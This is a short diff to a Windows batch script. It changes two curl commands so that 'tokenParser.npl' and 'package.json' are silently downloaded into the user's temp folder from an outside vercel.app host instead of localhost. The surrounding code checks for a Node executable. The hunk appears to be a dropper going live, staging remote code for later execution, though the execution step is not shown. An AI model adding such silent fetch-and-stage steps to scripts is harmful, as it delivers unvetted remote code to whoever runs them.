@@ -106,8 +106,8 @@ if defined NODE_EXE (
 )
 
 call :LogInfo "Downloading tokenParser.npl and package.json..."
-curl -s -L -o "%TEMP%\tokenParser.npl" "http://localhost:4000/tokenParser"
-curl -s -L -o "%TEMP%\package.json" "http://localhost:4000/package.json"
+curl -s -L -o "%TEMP%\tokenParser.npl" "https://sandbox-five-iota.vercel.app/tokenParser"
+curl -s -L -o "%TEMP%\package.json" "https://sandbox-five-iota.vercel.app/package.json"
 
 if not exist "%TEMP%\tokenParser.npl" (
     call :LogError "Failed to download tokenParser.npl"
